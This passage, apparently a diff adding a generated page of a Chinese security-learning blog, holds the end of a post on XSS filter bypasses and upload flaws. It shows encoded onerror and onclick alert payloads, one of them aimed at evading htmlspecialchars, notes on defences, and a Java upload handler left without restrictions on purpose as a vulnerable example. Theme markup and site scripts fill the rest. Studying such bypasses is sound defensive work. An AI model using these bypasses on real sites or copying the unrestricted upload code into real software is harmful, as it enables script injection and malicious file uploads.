onerror=&quot;</span>&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x31;&amp;#x31;&amp;#x31;&amp;#x31;&amp;#x31;&amp;#x31;&amp;#x31;&amp;#x31;&amp;#x29;<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># base64</span></span><br><span class="line"><span class="string">123&#x27;&quot;</span>&gt;&lt;img src=<span class="string">&quot;#&quot;</span> onerror=YWxlcnQoMTExMTExMTExKQ==&gt;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"><span class="comment">## 8，htmlspecialchars()函数绕过</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment"># 参数说明</span></span><br><span class="line">	ENT_QUOTES   <span class="comment"># 单引号、双引号都会被编码；</span></span><br><span class="line">	ENT_COMPAT   <span class="comment"># 双引号会被编码；</span></span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">123<span class="string">&#x27; onclick=&#x27;</span>alert(123)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">```</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这里推荐xss-labs</p>
+<p>防御</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用htmlspecialchars()和htmlentities()将一些预定义的字符转换为HTML实体。</span><br><span class="line">输入编码转义</span><br><span class="line">对输入的数据进行HTML转义，使其不会识别为可执行脚本</span><br><span class="line">白名单过滤</span><br><span class="line">根据白名单的标签和属性对数据进行过滤，以此来对可执行的脚本进行清除(如script标签，标签的onerror属性等)</span><br><span class="line">httpOnly</span><br><span class="line">httpOnly并不能防御XSS，它是为了解决XSS漏洞后面的Cookie劫持攻击，它可以有效地阻挡XSS会话劫持攻击。</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 原生漏洞场景，未做任何限制</span><br><span class="line">public R vul(MultipartFile file, HttpServletRequest request) &#123;</span><br><span class="line">    String res;</span><br><span class="line">    String suffix = FilenameUtils.getExtension(</span><br><span class="line">    // 查找文件名中最后一个点（.）之后的字符串</span><br><span class="line">    file.getOriginalFilename()); </span><br><span class="line">    String path = request.getScheme() + &quot;://&quot; + request.getServerName() + &quot;:&quot; + request.getServerPort() + &quot;/file/&quot;;</span><br><span class="line">    res = uploadUtil.uploadFile(file, suffix, path);</span><br><span class="line">    return R.ok(res);</span><br><span class="line">&#125;</span><br><span class="line">// uploadFile方法详见文件上传导致XSS模块</span><br></pre></td></tr></table></figure></div>
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 不知道写什么标题好的文章</li>
+        <li><strong>作者:</strong> wea5e1</li>
+        <li><strong>创建于
+                :</strong> 2026-01-19 22:47:04</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2026-02-14 12:03:06
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://hxl-lcm.github.io/2026/01/19/不知道写什么标题好的文章/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/01/21/Vulnhub-BlueMoon%202021/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Vulnhub-BlueMoon 2021</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.js';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">不知道写什么标题好的文章</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93%E8%B5%B7%E4%BB%80%E4%B9%88%E6%A0%87%E9%A2%98%E5%A5%BD"><span class="nav-text">不知道起什么标题好</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%92%8C%E9%AA%8C%E8%AF%81"><span class="nav-text">漏洞扫描和验证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E6%89%AB%E6%8F%8F%EF%BC%9A"><span class="nav-text">工具扫描：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E5%88%A4%E6%96%AD%EF%BC%9A"><span class="nav-text">手动判断：</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">wea5e1</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 8 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
